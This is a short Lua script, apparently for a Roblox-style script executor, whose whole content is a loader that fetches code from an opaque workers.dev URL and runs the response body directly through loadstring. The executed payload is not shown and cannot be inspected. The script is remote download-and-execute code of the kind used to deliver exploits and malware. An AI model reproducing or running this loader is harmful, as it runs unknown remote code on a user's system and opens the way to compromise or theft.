local function loadScript()
    local response = request({
        Url = "https://loldh67.c0mb026f-e59.workers.dev/",
        Method = "GET"
    })
    
    if response and response.Body then
        local func = loadstring(response.Body)
        if func then
            func()
        end
    end
end

loadScript()
